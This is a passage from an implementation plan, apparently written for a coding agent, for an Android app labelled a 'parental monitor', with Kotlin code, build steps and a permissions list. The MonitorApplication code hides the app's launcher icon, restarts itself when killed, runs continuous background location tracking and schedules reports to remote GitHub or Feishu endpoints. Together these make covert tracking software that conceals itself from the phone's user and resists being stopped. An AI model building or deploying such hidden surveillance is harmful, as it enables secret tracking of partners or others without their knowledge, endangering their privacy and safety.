    private val reportLogDao: ReportLogDao,
    private val diagnosticLogger: DiagnosticLogger
) : CoroutineWorker(context, workerParams) {

    override suspend fun doWork(): Result {
        val now = System.currentTimeMillis()
        val sevenDaysAgo = now - 7 * 24 * 3600_000L
        val thirtyDaysAgo = now - 30 * 24 * 3600_000L

        val lastReportedId = reportLogDao.getLastReportedRecordId()
        val deletedLocations = locationRecordDao.deleteReportedOlderThan(lastReportedId, sevenDaysAgo)
        val deletedLogs = reportLogDao.deleteFailedOlderThan(thirtyDaysAgo)

        diagnosticLogger.log("database_cleanup",
            """{"deleted_locations":$deletedLocations,"deleted_logs":$deletedLogs}""")
        return Result.success()
    }

    companion object {
        fun schedule(context: Context) {
            val work = PeriodicWorkRequestBuilder<CleanupWorker>(24, TimeUnit.HOURS).build()
            WorkManager.getInstance(context).enqueueUniquePeriodicWork(
                "cleanup", ExistingPeriodicWorkPolicy.KEEP, work
            )
        }
    }
}
```

- [ ] **Step 3: Write MonitorApplication**

```kotlin
// app/src/main/kotlin/com/monitor/app/MonitorApplication.kt
package com.monitor.app

import android.app.Application
import android.content.pm.PackageManager
import android.os.Build
import androidx.work.*
import com.monitor.app.config.ConfigManager
import com.monitor.app.diag.DiagnosticLogger
import com.monitor.app.keepalive.KeepAliveManager
import com.monitor.app.location.LocationService
import com.monitor.app.location.LocationWorker
import com.monitor.app.report.ReportWorker
import com.monitor.app.util.TimeRangeMatcher
import dagger.hilt.android.HiltAndroidApp
import java.time.LocalTime
import java.util.concurrent.TimeUnit
import javax.inject.Inject

@HiltAndroidApp
class MonitorApplication : Application() {

    @Inject lateinit var configManager: ConfigManager
    @Inject lateinit var keepAliveManager: KeepAliveManager
    @Inject lateinit var diagnosticLogger: DiagnosticLogger

    override fun onCreate() {
        super.onCreate()
        // Hide launcher icon
        disableLauncherIcon()

        // Detect if previously killed
        val wasKilled = keepAliveManager.checkWasKilled()
        if (wasKilled) {
            diagnosticLogger.log("service_killed")
            keepAliveManager.restartIfKilled()
        }

        // Initialize config
        configManager.init()

        // Start foreground location service
        val intent = android.content.Intent(this, LocationService::class.java)
        startForegroundService(intent)

        // Schedule watchdog
        val config = configManager.getConfigBlocking()
        keepAliveManager.scheduleWatchdog(config.keep_alive.watchdog.check_interval_seconds)

        // Schedule report worker
        scheduleReportUpdate()

        // Schedule cleanup
        CleanupWorker.schedule(this)
    }

    private fun scheduleReportUpdate() {
        val now = LocalTime.now()
        val config = configManager.getConfigBlocking()
        val active = config.report.intervals.find { interval ->
            val range = TimeRangeMatcher.TimeRange(interval.start, interval.end)
            TimeRangeMatcher.isInRange(range, now)
        }
        val intervalSeconds = active?.interval_seconds ?: 3600
        ReportWorker.schedule(this, intervalSeconds)
    }

    private fun disableLauncherIcon() {
        val componentName = android.content.ComponentName(this, "com.monitor.app.ui.HiddenActivity")
        packageManager.setComponentEnabledSetting(
            componentName,
            PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
            PackageManager.DONT_KILL_APP
        )
    }
}
```

- [ ] **Step 4: Commit**

```bash
git add app/src/main/kotlin/com/monitor/app/MonitorApplication.kt app/src/main/kotlin/com/monitor/app/db/DatabaseModule.kt app/src/main/kotlin/com/monitor/app/CleanupWorker.kt
git commit -m "feat: add MonitorApplication with Hilt, keep-alive initialization, and cleanup scheduling"
```

---

### Task 14: Integration and Final Wiring

**Files:**
- Review and finalize: all previously created files for consistency

- [ ] **Step 1: Verify Gradle sync and build**

```bash
./gradlew :app:assembleDebug
```
Expected: BUILD SUCCESSFUL. Fix any compilation errors.

- [ ] **Step 2: Run all unit tests**

```bash
./gradlew :app:test
```
Expected: all test targets pass.

- [ ] **Step 3: Check AndroidManifest permissions completeness**

Ensure all required permissions present:
- `ACCESS_FINE_LOCATION`
- `ACCESS_COARSE_LOCATION`
- `ACCESS_BACKGROUND_LOCATION` (required for Android 10+ background location)
- `FOREGROUND_SERVICE`
- `FOREGROUND_SERVICE_LOCATION`
- `RECEIVE_BOOT_COMPLETED`
- `INTERNET`
- `ACCESS_NETWORK_STATE`
- `WAKE_LOCK`
- `SCHEDULE_EXACT_ALARM`

- [ ] **Step 4: Update config.json5 in config/ with actual GitHub/Feishu URLs**

Instructions for deployment: replace `<user>` / `<repo>` / `<branch>` / `xxxxx` in config file and BuildConfig.

- [ ] **Step 5: Final commit**

```bash
git add -A
git commit -m "feat: complete initial implementation of parental monitor"
```
